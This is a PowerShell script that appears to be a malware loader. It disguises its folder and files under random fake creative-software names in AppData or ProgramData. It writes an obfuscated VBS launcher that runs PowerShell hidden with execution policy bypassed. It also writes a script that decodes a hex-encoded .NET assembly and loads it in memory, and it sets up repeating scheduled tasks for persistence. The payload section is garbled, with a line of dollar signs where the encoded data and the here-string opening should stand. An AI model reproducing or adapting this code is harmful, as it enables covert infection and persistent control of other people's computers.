$programs = @("PhotoshopProAM", "IllustratorXAM", "PremiereEditAM", "AfterEffectsAM", "Blender3DAM", "Maya3DAM", "ZBrushSculptAM", "DaVinciResolveAM", "CorelDrawXAM", "Cinema4DAM", "LightroomXAM")
$paths = @("$env:AppData\", "C:\ProgramData\")
$randomProgram = Get-Random -InputObject $programs
$randomPath = Get-Random -InputObject $paths
$fullPath = "$randomPath$randomProgram"

New-Item -Path $fullPath -ItemType Directory -Force

# ----------------------------------------------------------------------------- #
$ContentVBS = @"
On Error Resume Next
Dim arr, i, cmd
arr = Split("p,o,w,e,r,s,h,e,l,l", ",") 
cmd = Join(arr, "") 
cmd = cmd & " -ExecutionPolicy Bypass -NoProfile -Command ""IEX (Get-Content '$fullPath\$randomProgram.ps1' -Raw)"""
CreateObject("WScript.Shell").Run cmd, 0, False

"@
[IO.File]::WriteAllText("$fullPath\$randomProgram.vbs", $ContentVBS)

# ----------------------------------------------------------------------------- #

# ----------------------------------------------------------------------------- #

$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'
$hex = $hexString.Replace('$','0').Replace('^','1').Replace('#','4') -replace '[^0-9A-Fa-f]', ''
if ($hex.Length % 2 -ne 0) { $hex = $hex.Substring(0, $hex.Length - 1) }
[byte[]]$bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) {
    [Convert]::ToByte($hex.Substring($i, 2), 16)
}
[System.Reflection.Assembly]::Load($bytes) | Out-Null
[System.Windows.Forms.Application]::Run()
'@ 

[IO.File]::WriteAllText("$fullPath\$randomProgram.ps1", $ContentPS)


# ----------------------------------------------------------------------------- #
# Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ù…Ù‡Ù…Ø© Ø§Ù„Ù…Ø¬Ø¯ÙˆÙ„Ø©
Start-Sleep 2
try {
    $EASTNOD1 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$fullPath\$randomProgram.vbs`""
    $trigger1 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    Register-ScheduledTask -Action $EASTNOD1 -Trigger $trigger1 -TaskName "$randomProgram"
} catch {}

Start-Sleep 2
$taskName2 = "${randomProgram}Startup"

$scriptPath = "`"$fullPath\$randomProgram.vbs`""
try {
schtasks /create /tn "$taskName2" /tr $scriptPath /sc MINUTE /mo 45 /f
} catch { }
Start-Sleep 5
schtasks /run /tn "$randomProgram"
